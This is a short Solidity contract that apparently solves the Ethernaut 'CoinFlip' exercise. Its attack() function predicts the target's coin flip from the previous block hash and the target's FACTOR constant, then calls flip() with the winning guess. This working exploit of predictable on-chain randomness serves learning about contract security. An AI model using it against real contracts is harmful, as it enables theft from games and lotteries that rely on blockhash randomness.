// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

// Interface to interact with the target contract
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlip {
    ICoinFlip public target;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        target = ICoinFlip(_targetAddress);
    }

    function attack() external {
        // Step 1: Compute the same blockhash the target will use
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Step 2: Derive the coin flip outcome
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Step 3: Call the target with the correct answer
        target.flip(side);
    }
}
